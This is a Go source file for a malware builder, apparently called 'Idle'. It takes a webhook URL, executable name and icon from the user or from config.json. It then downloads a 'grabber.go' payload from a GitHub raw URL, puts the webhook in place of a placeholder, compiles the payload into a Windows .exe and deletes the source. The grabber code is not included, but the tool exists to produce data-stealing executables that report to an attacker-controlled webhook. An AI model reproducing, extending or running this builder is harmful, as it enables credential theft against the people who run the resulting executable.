package main

import (
	"encoding/json"
	"io/ioutil"
	"net/http"
	"strings"

	"fmt"
	"os"
	"os/exec"
	"time"

	_ "github.com/mattn/go-sqlite3"

	"github.com/fatih/color"
)

// Global Variables
var hostname string
var webhook string
var defaultSettings string
var fileName string
var fileIcon string
var saveSettings string



// Color Functions
var(
	blue = color.New(color.FgBlue).PrintFunc()
)


func clear(){
	// Clears Screen
	c := exec.Command("cmd", "/c", "cls")
    c.Stdout = os.Stdout
	c.Run()
}


type  WebhookConfig struct {
	Webhook string `json:"webhook"`
	Icon    string `json:"icon"`
	Name    string `json:"name"`
}

var config WebhookConfig


func Config() {
	filePath := "config.json"
	data, err := ioutil.ReadFile(filePath)
	if err != nil {
		fmt.Println("Error reading file:", err)
		return
	}
	err = json.Unmarshal(data, &config)
	if err != nil {
		fmt.Println("ERROR: ", err)
		return
	}
}



func init() {
	var err error
	hostname, err = os.Hostname()
	if err != nil {
		fmt.Println("ERROR:", err)
	}

}
 

func water(text string) string {
	faded := ""
	green := 10
	for _, line := range strings.Split(text, "\n") {
		faded += fmt.Sprintf("\033[38;2;0;%d;255m%s\033[0m\n", green, line)
		if green != 255 {
			green += 15
			if green > 255 {
				green = 255
			}
		}
	}
	return faded
}


func build(){
	r, err := http.Get("https://raw.githubusercontent.com/neverantia/idle/main/grabber.go")

	if err != nil{
		fmt.Println("["+color.RedString("!")+"]"+color.RedString("Error Getting Http Response: "), err)
		fmt.Println("["+color.RedString("!")+"]"+color.RedString("Closing In 3 Seconds."))
		time.Sleep(3 * time.Second)
		os.Exit(1)

	}
	defer r.Body.Close()


	b, err := ioutil.ReadAll(r.Body)

	if err != nil{
		fmt.Println("["+color.RedString("!")+"]"+color.RedString("Error Reading Http Response: "), err)
		fmt.Println("["+color.RedString("!")+"]"+color.RedString("Closing In 3 Seconds."))
		time.Sleep(3 * time.Second)
		os.Exit(1)

	}
	c := string(b)
	

	code := strings.Replace(c, "REPLACE-ME", webhook, -1)

	err = ioutil.WriteFile("code.go", []byte(code), 0777)

	if err != nil{
		fmt.Println("["+color.RedString("!")+"]"+color.RedString("Error Writing To File: "), err)
		fmt.Println("["+color.RedString("!")+"]"+color.RedString("Closing In 3 Seconds."))
		time.Sleep(3 * time.Second)
		os.Exit(1)
	}


	cmd := exec.Command("go", "build", "-o", fileName+".exe", "code.go")
	cmd.Run()
	err = os.Remove("code.go")
	if err != nil{
		fmt.Println("["+color.RedString("!")+"]"+color.RedString("Error Deleting File: "), err)
		fmt.Println("["+color.RedString("!")+"]"+color.RedString("Closing In 3 Seconds."))
		time.Sleep(3 * time.Second)
		os.Exit(1)
	}

	color.Blue("Executable Successfully Created!")

}


func main(){
	clear()
	idle := `
▪  ·▄▄▄▄  ▄▄▌  ▄▄▄ .
██ ██▪ ██ ██•  ▀▄.▀·
▐█·▐█· ▐█▌██▪  ▐▀▀▪▄	n e v e r a n t i a	
▐█▌██. ██ ▐█▌▐▌▐█▄▄▌
▀▀▀▀▀▀▀▀• .▀▀▀  ▀▀▀	`
	pWater := water(idle)
	fmt.Println(pWater)

	fmt.Printf("\nWelcome %s!", hostname)
	blue("\n\nWould You Like To Use Saved Settings [Y/N]: ")
	fmt.Scan(&defaultSettings)

	if (defaultSettings == "Y"){
		Config()
		webhook = config.Webhook
		fileIcon = config.Icon
		fileName = config.Name
		build()
	}
	if (defaultSettings == "N"){
		blue("Webhook: ")
		fmt.Scan(&webhook)
		blue("File Name: ")
		fmt.Scan(&fileName)
		blue("File Icon: ")
		fmt.Scan(&fileIcon)
		blue("Save These Settings [Y/N] : ")
		fmt.Scan(&saveSettings)
		if (saveSettings == "Y"){
			s := WebhookConfig{webhook, fileIcon, fileName}
			save, _ := json.MarshalIndent(s, "", " ")
			fmt.Println(string(save)) // was writing as b64 and this is the fix... no idea.
			_ = ioutil.WriteFile("config.json", save, 0644)		
		}
		build()

	}
}
